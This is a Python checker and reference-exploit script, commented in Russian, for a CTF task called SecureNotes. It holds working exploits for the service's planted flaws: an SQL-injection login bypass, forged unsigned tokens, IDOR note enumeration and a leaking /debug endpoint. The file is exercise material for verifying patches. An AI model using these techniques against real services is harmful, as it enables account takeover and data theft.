#!/usr/bin/env python3
"""Эталонный чекер и набор эксплойтов для SecureNotes (задание 01).

Двойное назначение:
  * organizers — та же логика plant/SLA, что и в Cloud Function чекера,
    чтобы локально проверить корректность сервиса;
  * players    — reference-эксплойты, чтобы убедиться, что уязвимость закрыта
    (после фикса эксплойт должен падать, а SLA — проходить).

Использование:
  python checker.py sla       http://localhost:8000
  python checker.py plant     http://localhost:8000 LIVECTF{...}
  python checker.py exploit   http://localhost:8000        # прогнать все эксплойты
"""

import base64
import secrets
import sys

import requests

TIMEOUT = 6


def _b(url):
    return url.rstrip("/")


# --------------------------------------------------------------------------- #
# Чекер                                                                        #
# --------------------------------------------------------------------------- #
def sla(url) -> bool:
    b = _b(url)
    try:
        if requests.get(f"{b}/health", timeout=TIMEOUT).status_code != 200:
            print("[SLA] health FAIL"); return False
        user = f"sla_{secrets.token_hex(4)}"
        pwd = secrets.token_hex(8)
        marker = secrets.token_hex(8)
        requests.post(f"{b}/register", json={"username": user, "password": pwd}, timeout=TIMEOUT)
        login = requests.post(f"{b}/login", json={"username": user, "password": pwd}, timeout=TIMEOUT)
        if login.status_code != 200:
            print("[SLA] login FAIL"); return False
        token = login.json()["token"]
        h = {"Authorization": f"Bearer {token}"}
        requests.post(f"{b}/notes", json={"title": "sla", "body": marker}, headers=h, timeout=TIMEOUT)
        mine = requests.get(f"{b}/notes/mine", headers=h, timeout=TIMEOUT)
        ok = mine.status_code == 200 and marker in mine.text
        print(f"[SLA] {'OK' if ok else 'FAIL'}")
        return ok
    except requests.RequestException as e:
        print(f"[SLA] network FAIL: {e}"); return False


def plant(url, flag) -> bool:
    b = _b(url)
    pwd = secrets.token_hex(12)
    requests.post(f"{b}/register", json={"username": "gamemaster", "password": pwd}, timeout=TIMEOUT)
    login = requests.post(f"{b}/login", json={"username": "gamemaster", "password": pwd}, timeout=TIMEOUT)
    token = login.json()["token"]
    h = {"Authorization": f"Bearer {token}"}
    r = requests.post(f"{b}/notes", json={"title": "round-flag", "body": flag}, headers=h, timeout=TIMEOUT)
    ok = r.status_code in (200, 201)
    print(f"[PLANT] {'OK id=' + str(r.json().get('id')) if ok else 'FAIL'}")
    return ok


# --------------------------------------------------------------------------- #
# Эксплойты (по одному на уязвимость)                                          #
# --------------------------------------------------------------------------- #
def forge_token(username: str) -> str:
    """Уязвимость 3: токен = base64(username), подпись не проверяется."""
    return base64.urlsafe_b64encode(username.encode()).decode()


def exploit_sqli_login(url) -> bool:
    """Уязвимость 1: обход авторизации через SQL-инъекцию в /login."""
    b = _b(url)
    payload = {"username": "gamemaster' -- ", "password": "x"}
    r = requests.post(f"{b}/login", json=payload, timeout=TIMEOUT)
    ok = r.status_code == 200 and "token" in r.json()
    print(f"[EXPLOIT sqli-login] {'VULNERABLE' if ok else 'patched'}")
    return ok


def exploit_forged_token(url) -> bool:
    """Уязвимость 3: подделываем токен gamemaster и читаем его заметки."""
    b = _b(url)
    h = {"Authorization": f"Bearer {forge_token('gamemaster')}"}
    r = requests.get(f"{b}/notes/mine", headers=h, timeout=TIMEOUT)
    leaked = r.status_code == 200 and "LIVECTF{" in r.text
    print(f"[EXPLOIT forged-token] {'VULNERABLE (flag leaked)' if leaked else 'patched'}")
    return leaked


def exploit_idor(url) -> bool:
    """Уязвимость 2: перебор /notes/<id> без проверки владельца."""
    b = _b(url)
    # Нужен любой валидный токен, чтобы пройти require-auth.
    user = f"att_{secrets.token_hex(3)}"
    requests.post(f"{b}/register", json={"username": user, "password": "x"}, timeout=TIMEOUT)
    token = requests.post(f"{b}/login", json={"username": user, "password": "x"}, timeout=TIMEOUT).json()["token"]
    h = {"Authorization": f"Bearer {token}"}
    for note_id in range(1, 50):
        r = requests.get(f"{b}/notes/{note_id}", headers=h, timeout=TIMEOUT)
        if r.status_code == 200 and "LIVECTF{" in r.text:
            print(f"[EXPLOIT idor] VULNERABLE (flag at note {note_id})")
            return True
    print("[EXPLOIT idor] patched")
    return False


def exploit_debug(url) -> bool:
    """Уязвимость 4: /debug раскрывает секрет и окружение."""
    b = _b(url)
    r = requests.get(f"{b}/debug", timeout=TIMEOUT)
    ok = r.status_code == 200 and "secret_key" in r.text
    print(f"[EXPLOIT debug] {'VULNERABLE' if ok else 'patched'}")
    return ok


def run_all_exploits(url) -> int:
    results = [
        exploit_sqli_login(url),
        exploit_forged_token(url),
        exploit_idor(url),
        exploit_debug(url),
    ]
    n = sum(1 for r in results if r)
    print(f"\nИтого активных уязвимостей: {n}/4")
    return n


def main():
    if len(sys.argv) < 3:
        print(__doc__)
        sys.exit(1)
    cmd, url = sys.argv[1], sys.argv[2]
    if cmd == "sla":
        sys.exit(0 if sla(url) else 1)
    elif cmd == "plant":
        flag = sys.argv[3] if len(sys.argv) > 3 else "LIVECTF{demo}"
        sys.exit(0 if plant(url, flag) else 1)
    elif cmd == "exploit":
        sys.exit(0 if run_all_exploits(url) > 0 else 1)
    else:
        print(__doc__); sys.exit(1)


if __name__ == "__main__":
    main()
